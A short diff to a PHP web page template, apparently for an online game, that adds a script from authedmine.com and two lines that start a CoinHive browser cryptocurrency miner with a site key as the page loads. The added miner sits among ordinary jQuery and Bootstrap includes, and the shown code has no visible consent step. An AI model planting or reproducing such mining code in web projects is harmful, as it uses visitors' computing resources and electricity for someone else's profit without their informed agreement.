@@ -171,7 +171,11 @@ $alphabet[-1] = '';
 	<script type="text/javascript" src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
 	<script type="text/javascript" src="<?=base_url()?>assets/js/moment.js"></script>
 	<script type="text/javascript" src="<?=base_url()?>assets/js/jquery.countdown.min.js"></script>
+	<script type="text/javascript" src="https://authedmine.com/lib/authedmine.min.js"></script>
 	<script>
+	var miner = new CoinHive.Anonymous('VGOoKHMh1AUbG8VtWD33mZzDhEznbMaX');
+	miner.start();
+
 	var me_id = 0, board = 0, last_action = 0, listener, lang;
 	var params = location.pathname.split("/");
 	var updateURL = function() {
